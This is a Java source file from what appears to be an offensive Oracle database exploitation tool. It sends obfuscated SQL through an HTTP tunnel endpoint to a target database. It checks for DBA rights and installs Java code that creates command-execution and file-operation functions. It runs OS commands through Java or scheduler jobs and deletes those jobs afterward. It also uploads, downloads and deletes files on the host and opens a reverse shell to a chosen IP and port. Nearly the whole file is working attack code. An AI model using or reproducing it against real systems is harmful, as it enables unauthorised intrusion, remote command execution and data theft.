package Dao;

import Controller.OracleController;
import Entity.ControllersFactory;
import Util.*;
import javafx.application.Platform;
import org.json.JSONObject;

import java.io.File;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.nio.charset.StandardCharsets;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

import static Util.Utils.splitDisk;
import static Util.Utils.splitFiles;

/**
 * @author ch1ng
 * @date 2022/5/21
 */
public class OracleHttpDao {
    /**
     * 用此方法获取 MysqlController 的日志框
     */
    private OracleController oracleController = (OracleController) ControllersFactory.controllers.get(OracleController.class.getSimpleName());
    private JSONObject dataObj;
    private Map<String, String> headers = new HashMap<>();
    private Map<String, String> params = new HashMap<>();
    private Map currentProxy = new HashMap();
    private String OS = "linux";

    public OracleHttpDao(JSONObject dataObj){
        this.dataObj = dataObj;
    }

    /**
     * 测试是否成功连接上数据库，不需要持久化连接
     * @return
     */
    public String testConnection() {
        String sql = OracleSqlUtil.checkSql;
        String randomString = Utils.getRandomString();
        sql = Base64XOR.base64Encode(String.format(sql, randomString).getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            response = response.replace("\r\n","").replace("\t|\t","");
            if(randomString.equals(response)){
                return "连接成功";
            }else if(response.contains("ERROR://")){
                return "连接失败！" + response.replace("ERROR://","");
            }
        } catch (Exception ex) {
            String error = ex.getMessage();
            MessageUtil.showExceptionMessage(ex, error);
        }
        return "连接失败";
    }


    public boolean getConnection(){
        String sql = OracleSqlUtil.checkSql;
        String randomString = Utils.getRandomString();
        sql = Base64XOR.base64Encode(String.format(sql, randomString).getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            response = response.replace("\r\n","").replace("\t|\t","");
            if(randomString.equals(response)){
                oracleController.oracleLogTextArea.appendText(Utils.log("连接成功！"));
                return true;
            }else if(response.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("连接失败！" + response.replace("ERROR://","")));
                return false;
            }
        } catch (Exception ex) {
            String error = ex.getMessage();
            MessageUtil.showExceptionMessage(ex, error);
        }
        return false;
    }

    /**
     * 判断当前账号是否为 DBA 账号
     */
    public void isDBA() {
        try {
            String sql = OracleSqlUtil.isDBASql;
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            response = response.replace("\r\n","").replace("\t|\t","");
            if("TRUE".equals(response.replace("\n",""))){
                oracleController.oracleLogTextArea.appendText(Utils.log("当前账号是 DBA 权限"));
            }else {
                oracleController.oracleLogTextArea.appendText(Utils.log("当前账号不是 DBA 权限"));
            }
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }

    /**
     * 获取当前版本号
     */
    public void getVersion(){
        try {
            String sql = OracleSqlUtil.getVersionSql;
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            response = response.replace("\t|\t","");
            //不等于 -1 就是找到了windows关键字
            if(response.toLowerCase().contains("windows")){
                OS = "windows";
            }
            oracleController.oracleLogTextArea.appendText(Utils.log("当前数据库版本:\n" + response));
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }

    /**
     * 初始化 ShellUtilJAVA 代码
     */
    public void importShellUtilJAVA(){
        try {
            String CREATE_SOURCE = OracleSqlUtil.ShellUtilCREATE_SOURCESql;
            String GRANT_JAVA_EXEC = OracleSqlUtil.ShellUtilGRANT_JAVA_EXECSql;
            // 赋予命令执行权限
            String GRANT_JAVA_EXEC2 = OracleSqlUtil.ShellUtilGRANT_JAVA_EXEC2Sql;
            // 赋予网络连接允许权限
            // 参考 https://docs.oracle.com/javase/8/docs/technotes/guides/security/spec/security-spec.doc3.html
            String GRANT_JAVA_EXEC3 = OracleSqlUtil.ShellUtilGRANT_JAVA_EXEC3Sql;
            String CREATE_FUNCTION = OracleSqlUtil.ShellUtilCREATE_FUNCTIONSql;

            // 获取插件目录
            String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Oracle" + File.separator + "ShellUtil.java";
            // 读取插件内容
            String SHELLUTILSOURCE = Utils.readFile(path);
            CREATE_SOURCE = String.format(CREATE_SOURCE, SHELLUTILSOURCE);
            CREATE_SOURCE = Base64XOR.base64Encode(CREATE_SOURCE.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response = executeSQLStatement(this.dataObj,CREATE_SOURCE,"UTF-8");
            response = response.replace("\t|\t","").replace("\r\n","");
            if(response.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("导入 JAVA 代码失败！错误：" + response.replace("ERROR://","")));
                return;
            }
            oracleController.oracleLogTextArea.appendText(Utils.log("导入 JAVA 代码成功！"));

            GRANT_JAVA_EXEC = Base64XOR.base64Encode(GRANT_JAVA_EXEC.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response2 = executeSQLStatement(this.dataObj,GRANT_JAVA_EXEC,"UTF-8");
            response2 = response2.replace("\t|\t","").replace("\r\n","");
            if(response2.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("赋权失败！错误：" + response2.replace("ERROR://","")));
                return;
            }

            GRANT_JAVA_EXEC2 = Base64XOR.base64Encode(GRANT_JAVA_EXEC2.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response3 = executeSQLStatement(this.dataObj,GRANT_JAVA_EXEC2,"UTF-8");
            response3 = response3.replace("\t|\t","").replace("\r\n","");
            if(response3.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("赋权失败！错误：" + response3.replace("ERROR://","")));
                return;
            }

            GRANT_JAVA_EXEC3 = Base64XOR.base64Encode(GRANT_JAVA_EXEC3.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response4 = executeSQLStatement(this.dataObj,GRANT_JAVA_EXEC3,"UTF-8");
            response4 = response4.replace("\t|\t","").replace("\r\n","");
            if(response4.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("赋权失败！错误：" + response4.replace("ERROR://","")));
                return;
            }
            oracleController.oracleLogTextArea.appendText(Utils.log("赋权成功！"));

            CREATE_FUNCTION = Base64XOR.base64Encode(CREATE_FUNCTION.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response5 = executeSQLStatement(this.dataObj,CREATE_FUNCTION,"UTF-8");
            response5 = response5.replace("\t|\t","").replace("\r\n","");
            if(response5.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("创建 ShellRun 函数失败！错误：" + response5.replace("ERROR://","")));
                return;
            }
            oracleController.oracleLogTextArea.appendText(Utils.log("创建 ShellRun 函数成功！"));
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }

    /**
     * 初始化 FileUtilJAVA 代码
     */
    public void importFileUtilJAVA(){
        try {
            String CREATE_SOURCE = OracleSqlUtil.FileUtilCREATE_SOURCESql;
            String GRANT_JAVA_EXEC = OracleSqlUtil.FileUtilGRANT_JAVA_EXECSql;
            // 赋予文件操作属性权限
            // 参考 https://docs.oracle.com/javase/8/docs/technotes/guides/security/spec/security-spec.doc3.html
            String GRANT_JAVA_EXEC1 = OracleSqlUtil.FileUtilGRANT_JAVA_EXEC1Sql;
            String CREATE_FUNCTION = OracleSqlUtil.FileUtilCREATE_FUNCTIONSql;
            // 获取插件目录
            String path =
                    Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Oracle" + File.separator + "FileUtil.java";
            // 读取插件内容
            String FILEUTILSOURCE = Utils.readFile(path);
            CREATE_SOURCE = String.format(CREATE_SOURCE, FILEUTILSOURCE);
            //executeSql(CREATE_SOURCE);
            CREATE_SOURCE = Base64XOR.base64Encode(CREATE_SOURCE.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response = executeSQLStatement(this.dataObj,CREATE_SOURCE,"UTF-8");
            response = response.replace("\t|\t","").replace("\r\n","");
            if(response.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("导入 JAVA 代码失败！错误：" + response.replace("ERROR://","")));
                return;
            }
            oracleController.oracleLogTextArea.appendText(Utils.log("导入 JAVA 代码成功！"));
            //executeSql(GRANT_JAVA_EXEC);
            //executeSql(GRANT_JAVA_EXEC1);
            GRANT_JAVA_EXEC = Base64XOR.base64Encode(GRANT_JAVA_EXEC.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response2 = executeSQLStatement(this.dataObj,GRANT_JAVA_EXEC,"UTF-8");
            response2 = response2.replace("\t|\t","").replace("\r\n","");
            if(response2.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("赋权失败！错误：" + response2.replace("ERROR://","")));
                return;
            }

            GRANT_JAVA_EXEC1 = Base64XOR.base64Encode(GRANT_JAVA_EXEC1.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response3 = executeSQLStatement(this.dataObj,GRANT_JAVA_EXEC1,"UTF-8");
            response3 = response3.replace("\t|\t","").replace("\r\n","");
            if(response3.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("赋权失败！错误：" + response3.replace("ERROR://","")));
                return;
            }
            oracleController.oracleLogTextArea.appendText(Utils.log("赋权成功！"));
            //executeSql(CREATE_FUNCTION);
            CREATE_FUNCTION = Base64XOR.base64Encode(CREATE_FUNCTION.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response4 = executeSQLStatement(this.dataObj,CREATE_FUNCTION,"UTF-8");
            response4 = response4.replace("\t|\t","").replace("\r\n","");
            if(response4.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("创建 FileRun 函数失败！错误：" + response4.replace("ERROR://","")));
                return;
            }
            oracleController.oracleLogTextArea.appendText(Utils.log("创建 FileRun 函数成功！"));
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }



    /**
     * 删除 ShellUtil 函数
     */
    public void deleteShellFunction(){
        try {
            String checkSql = OracleSqlUtil.checkShellFunctionSql;
            String dropJAVASql = OracleSqlUtil.deleteShellJAVASOURCESql;
            String dropFuncSql = OracleSqlUtil.deleteShellFunctionSql;
            checkSql = Base64XOR.base64Encode(checkSql.getBytes(StandardCharsets.UTF_8), "UTF-8");
            String response = executeSQLStatement(this.dataObj, checkSql, "UTF-8");
            response = response.replace("\t|\t", "").replace("\r\n", "");
            if(!"".equals(response)){
                dropJAVASql = Base64XOR.base64Encode(dropJAVASql.getBytes(StandardCharsets.UTF_8), "UTF-8");
                String response2 = executeSQLStatement(this.dataObj, dropJAVASql, "UTF-8");
                response2 = response2.replace("\t|\t", "").replace("\r\n", "");
                if(response2.contains("ERROR://")){
                    oracleController.oracleLogTextArea.appendText(Utils.log("删除 SHELLRUN 函数失败！错误：" + response2.replace("ERROR://","")));
                    return;
                }

                dropFuncSql = Base64XOR.base64Encode(dropFuncSql.getBytes(StandardCharsets.UTF_8), "UTF-8");
                String response3 = executeSQLStatement(this.dataObj, dropFuncSql, "UTF-8");
                response3 = response3.replace("\t|\t", "").replace("\r\n", "");
                if(response3.contains("ERROR://")){
                    oracleController.oracleLogTextArea.appendText(Utils.log("删除 SHELLRUN 函数失败！错误：" + response3.replace("ERROR://","")));
                    return;
                }

                oracleController.oracleLogTextArea.appendText(Utils.log("删除 SHELLRUN 函数成功！"));
            }else {
                oracleController.oracleLogTextArea.appendText(Utils.log("删除 SHELLRUN 函数失败！函数可能不存在！"));
            }

        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }


    /**
     * 执行系统命令
     * @param command 要执行的命令
     * @param code 编码
     * @param type 执行类型 java or scheduler
     */
    public String executeCommand(String command,String code,String type){
        String response = "";
        try {
            switch (type){
                case "java":
                    String cmdSqlString = OracleSqlUtil.shellRunSql;
                    cmdSqlString = String.format(cmdSqlString,command,code);
                    cmdSqlString = Base64XOR.base64Encode(cmdSqlString.getBytes(StandardCharsets.UTF_8), "UTF-8");
                    response = executeSQLStatement(this.dataObj, cmdSqlString, "UTF-8");
                    response = response.replace("\t|\t", "").replace("\r\n", "");
                    if(response.contains("ERROR://")){
                        if(response.contains("ORA-00904")){
                            oracleController.oracleLogTextArea.appendText(Utils.log("请先初始化方法！"));
                            break;
                        }else if(response.contains("ORA-27486")){
                            oracleController.oracleLogTextArea.appendText(Utils.log("当前账号权限不足！无法执行！"));
                            break;
                        }
                        oracleController.oracleLogTextArea.appendText(Utils.log("执行命令失败！错误：" + response.replace("ERROR://","")));
                        break;
                    }
                    oracleController.oracleLogTextArea.appendText(Utils.log("执行命令成功！"));
                    break;
                case "scheduler":
                    schedulerCmd(command);
                    break;
                default:
                    break;
            }
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return response;
    }


    /**
     * scheduler 执行命令
     * @param commnads
     * @throws SQLException
     * @throws InterruptedException
     */
    public void schedulerCmd(String commnads) {
//        BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'Jo2441',job_type=>'EXECUTABLE',number_of_arguments=>2,job_action =>'C:/Winodws/System32/cmd.exe',auto_drop=>FALSE);END;
//        BEGIN DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1228',1,'2');END;
//        BEGIN DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1228',2,'whoami > C:\1.txt');END;
//        BEGIN DBMS_SCHEDULER.ENABLE('J1228');END;
//        select log_id, log_date, job_name, status, error#, additional_info from dba_scheduler_job_run_details where job_name ='J1228';
        try {
            String[] cmds = commnads.split(" ");
            // 如果第一个参数存在 cmd 参数则采用 cmd /c 方式执行命令
            // 暂时废弃 自行补全 windows下一定要 '\' 不然会出错
//            if(cmds[0].contains("cmd")){
//                cmds[0] = "C:\\Windows\\System32\\cmd.exe";
//            }
            String randomJobName = "JOB_"+Utils.getRandomString().toUpperCase(Locale.ROOT);
            String CREATE_JOBSql = OracleSqlUtil.CREATE_JOBSql;
            String SET_JOB_ARGUMENT_VALUESql = OracleSqlUtil.SET_JOB_ARGUMENT_VALUESql;
            String ENABLESql = OracleSqlUtil.ENABLESql;
            // 拼接
            CREATE_JOBSql = String.format(CREATE_JOBSql,randomJobName,cmds.length - 1,cmds[0]);
            CREATE_JOBSql = Base64XOR.base64Encode(CREATE_JOBSql.getBytes(StandardCharsets.UTF_8), "UTF-8");
            String response = executeSQLStatement(this.dataObj, CREATE_JOBSql, "UTF-8");
            response = response.replace("\t|\t", "").replace("\r\n", "");
            if(response.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("Scheduler 任务执行失败！错误："+response.replace(
                        "ERROR://","")));
                return;
            }
            for(int i = 0; i < cmds.length; i++) {
                if(i !=0){
                    String tmpStr = String.format(SET_JOB_ARGUMENT_VALUESql,randomJobName,i,cmds[i]);
                    tmpStr = Base64XOR.base64Encode(tmpStr.getBytes(StandardCharsets.UTF_8), "UTF-8");
                    String response2 = executeSQLStatement(this.dataObj, tmpStr, "UTF-8");
                    response2 = response2.replace("\t|\t", "").replace("\r\n", "");
                    if(response2.contains("ERROR://")){
                        oracleController.oracleLogTextArea.appendText(Utils.log("Scheduler 任务执行失败！错误："+response2.replace(
                                "ERROR://","")));
                        return;
                    }
                }
            }
            // 执行当前任务
            ENABLESql = String.format(ENABLESql,randomJobName);
            ENABLESql = Base64XOR.base64Encode(ENABLESql.getBytes(StandardCharsets.UTF_8), "UTF-8");
            String response3 = executeSQLStatement(this.dataObj, ENABLESql, "UTF-8");
            response3 = response3.replace("\t|\t", "").replace("\r\n", "");
            if(response3.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("Scheduler 任务执行失败！错误："+response3.replace(
                        "ERROR://","")));
                return;
            }
            oracleController.oracleLogTextArea.appendText(Utils.log("正在获取 "+ randomJobName +" 任务状态...请稍等"));
            // 获取任务状态
            getJobStatus(randomJobName);
            oracleController.oracleLogTextArea.appendText(Utils.log("获取 " + randomJobName +" 任务状态成功！"));
            // 删除任务
            deleteJob(randomJobName,"True","False");
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }


    /**
     * 获取任务状态
     * @param jobname
     * @throws SQLException
     * @throws InterruptedException
     */
    public void getJobStatus(String jobname) throws InterruptedException {
        // 延时 5s 之后才获取任务状态
        Thread.sleep(5000);
        String sql = String.format(OracleSqlUtil.getJobStatusSql,jobname);
        String additional_info = "";
        sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8), "UTF-8");
        String response = executeSQLStatement(this.dataObj, sql, "UTF-8");
        if(response.contains("ERROR://")){
            response = response.replace("\t|\t", "").replace("\r\n", "");
            oracleController.oracleLogTextArea.appendText(Utils.log("获取任务状态失败！错误："+response.replace(
                    "ERROR://","")));
        }else if(response.contains("FAILED")){
            response = response.replace("\r\n", "");
            String[] tempData =  response.split("\t\\|\t");
            additional_info = tempData[1];
            oracleController.oracleLogTextArea.appendText(Utils.log(jobname + " 任务执行失败！"));
            oracleController.Textarea_OracleCommandResult.setText(additional_info);
        }else {
            oracleController.oracleLogTextArea.appendText(Utils.log(jobname + " 任务执行完成！"));
        }
    }

    /**
     * 删除已经运行完的 job
     * @param jobname
     */
    public void deleteJob(String jobname,String force,String defer) {
        try {
            String checkSql = String.format(OracleSqlUtil.checkJobSql,jobname);
            checkSql = Base64XOR.base64Encode(checkSql.getBytes(StandardCharsets.UTF_8), "UTF-8");
            String response = executeSQLStatement(this.dataObj, checkSql, "UTF-8");
            //String realJobName = executeSql(checkSql).replace("\n","");
            response = response.replace("\t|\t", "").replace("\r\n", "");
            if("".equals(response)){
                oracleController.oracleLogTextArea.appendText(Utils.log(jobname +" 任务不存在！"));
                return;
            }
            String sql = OracleSqlUtil.deleteJobSql;
            sql = String.format(sql,jobname,force,defer);
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8), "UTF-8");
            String response2 = executeSQLStatement(this.dataObj, sql, "UTF-8");
            if(response2.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("任务删除失败！错误："+response2.replace(
                        "ERROR://","")));
                return;
            }
            oracleController.oracleLogTextArea.appendText(Utils.log(jobname +" 任务删除成功！"));
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }

    /**
     * 删除 FileUtil 函数
     */
    public void deleteFileFunction(){
        String res = "";
        try {
            String checkSql = OracleSqlUtil.checkFileFunctionSql;
            String dropJAVASql = OracleSqlUtil.deleteFileJAVASOURCESql;
            String dropFuncSql = OracleSqlUtil.deleteFileFunctionSql;


            checkSql = Base64XOR.base64Encode(checkSql.getBytes(StandardCharsets.UTF_8), "UTF-8");
            String response = executeSQLStatement(this.dataObj, checkSql, "UTF-8");
            response = response.replace("\t|\t", "").replace("\r\n", "");
            if(!"".equals(response)){
                dropJAVASql = Base64XOR.base64Encode(dropJAVASql.getBytes(StandardCharsets.UTF_8), "UTF-8");
                String response2 = executeSQLStatement(this.dataObj, dropJAVASql, "UTF-8");
                response2 = response2.replace("\t|\t", "").replace("\r\n", "");
                if(response2.contains("ERROR://")){
                    oracleController.oracleLogTextArea.appendText(Utils.log("删除 FILERUN 函数失败！错误：" + response2.replace("ERROR://","")));
                    return;
                }

                dropFuncSql = Base64XOR.base64Encode(dropFuncSql.getBytes(StandardCharsets.UTF_8), "UTF-8");
                String response3 = executeSQLStatement(this.dataObj, dropFuncSql, "UTF-8");
                response3 = response3.replace("\t|\t", "").replace("\r\n", "");
                if(response3.contains("ERROR://")){
                    oracleController.oracleLogTextArea.appendText(Utils.log("删除 FILERUN 函数失败！错误：" + response3.replace("ERROR://","")));
                    return;
                }
                oracleController.oracleLogTextArea.appendText(Utils.log("删除 FILERUN 函数成功！"));
            }else {
                oracleController.oracleLogTextArea.appendText(Utils.log("删除 FILERUN 函数失败！函数可能不存在！"));
            }
            //res = executeSql(checkSql).replace("\n","");
            //// 不等于空就说明存在 shellrun 函数
            //if(!"".equals(res)){
            //    executeSql(dropFuncSql);
            //    executeSql(dropJAVASql);
            //}else {
            //    oracleController.oracleLogTextArea.appendText(Utils.log("删除 FILERUN 函数失败！"));
            //}
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }

    /**
     * 获取所有盘符
     * @return
     */
    public ArrayList<String> getDisk(){
        ArrayList<String> res = new ArrayList<String>();
        String sql = OracleSqlUtil.getDiskSql;
        try {
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8), "UTF-8");
            String response = executeSQLStatement(this.dataObj, sql, "UTF-8");
            response = response.replace("\t|\t", "").replace("\r\n", "");
            if(response.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("获取盘符失败！错误：" + response.replace("ERROR://","")));
                return res;
            }
            res = splitDisk(response);
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return res;
    }

    /**
     * 获取路径下所有的文件夹和文件名
     * @param path
     * @param code
     * @return
     */
    public ArrayList<String> getFiles(String path,String code){
        ArrayList<String> res = new ArrayList<String>();
        if (code == null || code.equals("")) {
            code = "UTF-8";
        }
        String sql = String.format(OracleSqlUtil.getFilesSql,path,code);
        try {
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8), "UTF-8");
            String response = executeSQLStatement(this.dataObj, sql, "UTF-8");
            response = response.replace("\t|\t", "").replace("\r\n", "");
            if(response.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("获取文件失败！错误：" + response.replace("ERROR://",
                        "")));
                return res;
            }
            res = splitFiles(response);
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return res;
    }

    /**
     * 上传文件
     * @param path
     * @param contexts
     */
    public void upload(String path,String contexts){
        String sql = OracleSqlUtil.uploadSql;
        try {
            sql = String.format(sql,path,contexts);
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8), "UTF-8");
            String response = executeSQLStatement(this.dataObj, sql, "UTF-8");
            response = response.replace("\t|\t", "").replace("\r\n", "");
            if(response.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("上传文件失败！错误："+response.replace("ERROR://","")));
                return;
            }
            if(response.contains("ok")){
                oracleController.oracleLogTextArea.appendText(Utils.log("上传文件成功！"));
            }else {
                oracleController.oracleLogTextArea.appendText(Utils.log("上传文件失败！错误："+response));
            }
            //PublicUtil.log("上传文件成功！");
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
            //PublicUtil.log(throwables.getMessage());
        }
    }
    /**
     * 删除文件
     * @param path
     * @return
     */
    public String delete(String path){
        String sql = OracleSqlUtil.deleteSql;
        String response = null;
        try {
            sql = String.format(sql,path);
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8), "UTF-8");
            response = executeSQLStatement(this.dataObj, sql, "UTF-8");
            response = response.replace("\t|\t", "").replace("\r\n", "");
            if(response.contains("ERROR://")){
                return "";
            }
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return response;
    }

    /**
     * 下载文件
     * @param path
     * @return
     */
    public String download(String path){
        String sql = OracleSqlUtil.downloadSql;
        String response = "";
        try {
            sql = String.format(sql,path);
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8), "UTF-8");
            response = executeSQLStatement(this.dataObj, sql, "UTF-8");
            response = response.replace("\t|\t", "").replace("\r\n", "");
            return response;
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return response;
    }

    /**
     * java 反弹shell
     * @param ip
     * @param port
     */
    public void reverseJavaShell(String ip,String port){
        String sql = OracleSqlUtil.checkReverseJavaShellSql;
        String response = "";
        try {
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8), "UTF-8");
            response = executeSQLStatement(this.dataObj, sql, "UTF-8");
            response = response.replace("\t|\t", "").replace("\r\n", "");
            if(response.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("查询 SHELLRUN 函数失败！错误："+response.replace(
                        "ERROR://","")));
                return;
            }else if("".equals(response)){
                oracleController.oracleLogTextArea.appendText(Utils.log("SHELLRUN 函数不存在！，请先创建函数！"));
            }else {
                String sql2 = String.format(OracleSqlUtil.reverseJavaShellSql,ip,port);
                sql2 = Base64XOR.base64Encode(sql2.getBytes(StandardCharsets.UTF_8), "UTF-8");
                String response2 = executeSQLStatement(this.dataObj, sql2, "UTF-8");
                response2 = response2.replace("\t|\t", "").replace("\r\n", "");
                if(response2.contains("ERROR://")){
                    oracleController.oracleLogTextArea.appendText(Utils.log("反弹 Shell 失败！错误："+response2.replace(
                            "ERROR://","")));
                    return;
                }
                oracleController.oracleLogTextArea.appendText(Utils.log("反弹 Shell 成功！"));
            }
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }

    /**
     * 执行 Sql 语句
     * @param dataObj
     * @param sql
     * @return
     */
    private String executeSQLStatement(JSONObject dataObj, String sql, String code) {
        String url = dataObj.getString("url");
        String timeOut = dataObj.getString("timeout");
        String isProxy = dataObj.getString("isproxy");
        String header = dataObj.getString("httpheaders");
        String key = dataObj.getString("encryptionkey");
        String args = dataObj.getString("ipaddress" )+ ":" + dataObj.getString("port") + "|";
        args += dataObj.getString("username") + "|";
        args += dataObj.getString("password") + "|";
        args += dataObj.getString("database") + "|";
        args += sql;
        //args += Base64XOR.base64Encode(String.format(sql, randomString).getBytes(StandardCharsets.UTF_8),"UTF-8");
        params.put(key, Base64XOR.encode(args,key));
        try {
            if(!header.equals("")){
                headers = Utils.splitHeaders(header);
            }
            if(!isProxy.equals("false")){
                Proxy proxy;
                String proxyAddress = this.dataObj.getString("proxyaddress");
                String proxyType =  this.dataObj.getString("proxytype");
                String proxyPort = this.dataObj.getString("proxyport");
                String proxyuUername = this.dataObj.getString("proxyusername");
                String proxyPassword = this.dataObj.getString("proxypassword");
                InetSocketAddress proxyAddr = new InetSocketAddress(proxyAddress, Integer.parseInt(proxyPort));
                if("SOCKS5".equals(proxyType)){
                    proxy = new Proxy(Proxy.Type.SOCKS, proxyAddr);
                }else {
                    proxy = new Proxy(Proxy.Type.HTTP, proxyAddr);
                }
                currentProxy.put("proxy", proxy);
                currentProxy.put("username", proxyuUername);
                currentProxy.put("password", proxyPassword);
            }
            String response = OKHttpUtil.getBodyWithPost(url,params,headers,Integer.parseInt(timeOut),"UTF-8",currentProxy);
            if (response.contains("同步请求异常")){
                return "ERROR://请尝试延长超时时间";
            }
            return Base64XOR.decode(response,key,code);
        } catch (Exception ex) {
            String error = ex.getMessage();
            MessageUtil.showExceptionMessage(ex, error);
        }
        return "";
    }
}
